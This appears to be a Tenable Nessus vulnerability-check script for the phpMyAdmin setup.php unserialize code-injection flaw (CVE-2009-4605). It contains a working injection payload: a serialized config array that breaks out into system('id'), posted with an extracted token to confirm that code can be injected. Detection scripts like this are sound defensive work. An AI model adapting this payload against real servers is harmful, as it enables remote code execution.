#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44324);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2014/08/09 00:11:24 $");

  script_cve_id("CVE-2009-4605");
  script_bugtraq_id(37861);
  script_osvdb_id(61861);
  script_xref(name:"Secunia", value:"38211");

  script_name(english:"phpMyAdmin setup.php unserialize() Arbitrary PHP Code Execution (PMASA-2010-3)");
  script_summary(english:"Checks if code can be injected into the config file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that may allow
execution of arbitrary code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The setup script included with the version of phpMyAdmin installed on
the remote host does not properly sanitize user-supplied input before
using it to generate a config file for the application.  Submitting a
specially crafted POST request can result in arbitrary PHP code
injection.

A remote attacker could exploit this issue in a cross-site request
forgery attack, which could be used to execute arbitrary commands
on the system with the privileges of the web server."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2010-3.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to phpMyAdmin 2.11.10 / 3.0.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/01/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/01/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/01/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");


port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'phpMyAdmin', port:port, exit_on_fail:TRUE);

# The first request makes sure the page exists, the PMA config is writeable,
# and extracts the token
url = install['dir']+'/scripts/setup.php';
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# If the config can't be written to disk, this cannot be exploited - even
# if the software is unpatched.  In which case, only continue if paranoid.
if ('Can not load or save configuration' >< res[2])
{
  if (report_paranoia < 2)
    exit(1, 'The phpMyAdmin install at '+build_url(qs:install['dir']+'/', port:port)+' might be unpatched, but cannot be exploited.');
  else
    config_writeable = FALSE;
}
else config_writeable = TRUE;

# Extract the token.
token = NULL;
pat = 'input type="hidden" name="token" value="([^"]+)"';
match = eregmatch(string:res[2], pattern:pat);
if (match) token = match[1];
else exit(1, "Unable to extract token from "+build_url(qs:url, port:port));

# The second request determines if PHP code can be injected into the config file
cmd = 'id';
array_name = "TNS";
inj_code = SCRIPT_NAME+"'] = "+unixtime()+"; system('"+cmd+"'); //";
expected_out = "$cfg['Servers'][$i]['"+array_name+"']['" + inj_code;
config=
  'a:1:{'+
    's:7:"Servers";'+
    'a:1:{'+
      'i:0;'+
      'a:1:{'+
        's:'+strlen(array_name)+':"'+array_name+'";'+
        'a:1:{'+
          's:'+strlen(inj_code)+':"'+inj_code+'";'+
          's:0:"";'+
        '}'+
      '}'+
    '}'+
  '}';
postdata =
  'token='+token+'&'+
  'action=download&'+
  'configuration='+urlencode(str:config);
res = http_send_recv3(
  method:"POST",
  item:url,
  port:port,
  data:postdata,
  content_type:"application/x-www-form-urlencoded",
  exit_on_fail:TRUE
);

if (expected_out >< res[2])
{
  if (!config_writeable)
  {
    report =
      '\nEven though the software is unpatched, the web server does not\n'+
      'have permission to write the configuration file to disk, which\n'+
      'means the vulnerability cannot be exploited at this time.\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
{
  full_url = build_url(qs:install['dir']+'/', port:port);
  exit(0, 'The phpMyAdmin install at '+full_url+' is not affected.');
}
